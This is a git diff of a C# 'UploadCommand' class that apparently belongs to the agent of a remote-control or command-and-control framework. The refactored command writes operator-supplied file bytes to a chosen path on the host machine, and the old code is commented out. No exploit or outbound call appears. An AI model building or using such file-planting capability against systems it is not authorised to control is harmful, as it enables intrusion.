@@ -1,29 +1,36 @@
 ﻿using Agent.Models;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
     public class UploadCommand : AgentCommand
     {
-        public override string Name => "upload";
-
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.Upload;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            if (task.SplittedArgs.Length == 0)
+            task.ThrowIfParameterMissing(ParameterId.File);
+            task.ThrowIfParameterMissing(ParameterId.Name);
+
+            string fileName = task.GetParameter<string>(ParameterId.Name);
+            var fileContent = task.GetParameter(ParameterId.File);
+
+           
+            using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
             {
-                context.Result.Result = "Please specify the name of the file to upload!";
-                return;
+                fs.Write(fileContent, 0, fileContent.Length);
             }
 
-            var path = task.SplittedArgs[0];
-            var filename = Path.GetFileName(path);
+            context.AppendResult($"File uploaded to {fileName}.");
 
-            if (!File.Exists(path))
+
+            /*if (!File.Exists(path))
             {
                 context.Result.Result = $"File {path} not found.";
                 return;
@@ -51,7 +58,7 @@ namespace Agent.Commands
             {
                 FileId = fileId,
                 FileName = filename,
-            });
+            });*/
 
 
         }
